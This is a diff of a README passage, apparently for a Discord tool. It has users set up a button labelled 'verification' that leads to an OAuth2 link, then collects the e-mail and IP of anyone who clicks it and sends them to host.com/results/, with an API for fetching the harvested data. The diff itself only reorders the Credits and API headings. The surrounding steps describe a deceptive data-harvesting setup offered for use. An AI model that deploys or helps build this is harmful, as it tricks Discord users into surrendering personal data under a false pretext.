@@ -46,11 +46,15 @@ Ok, now if you correctly setup your variables you will be able to continue.
 ....3.3 Now right click in the webhook's message > Applications > Add Button > Link. In the `"label"` field just add something like "verification" in `"emoji name"` I recommend to use :white_check_mark: and in `LINK` add you OAuth2 link that you generated before.
 
 4/ Now, when something uses your button his e-mail and ip will be sent to `host.com/results/`!
-## Credits
 
-#### Use the api
+## Use the api
 
 you can use https://host.com/api/v1/api.php?id=ID_VERIFIED_USER to get informations with a bot.
+
+
+## Credits
+
+
 
 Thanks to MarkisDev (https://github.com/MarkisDev) for is incredible discord OAuth2 login flow
 
